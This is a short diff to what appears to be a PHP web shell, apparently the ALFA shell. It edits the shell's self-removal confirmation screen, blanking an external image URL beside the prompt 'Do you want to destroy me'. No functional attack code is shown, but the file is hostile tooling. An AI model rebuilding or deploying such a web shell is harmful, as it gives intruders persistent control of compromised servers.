@@ -5016,7 +5016,7 @@ echo('</center>');
 if(isset($_POST['alfa1'])&&$_POST['alfa1']!='yes'){
 echo "<div class=header>";
 echo "
-<center><p><img src=\"https://pomf2.lain.la/f/a7hls8so.png\"></p>";
+<center><p><img src=\"\"></p>";
 echo '<p><div class="txtfont">Do you want to destroy me :( ?!</div><a href=javascript:void(0) onclick="g(\'selfrm\',null,\'yes\');"> Yes</a>';
 echo '</p></center></div>';
 }
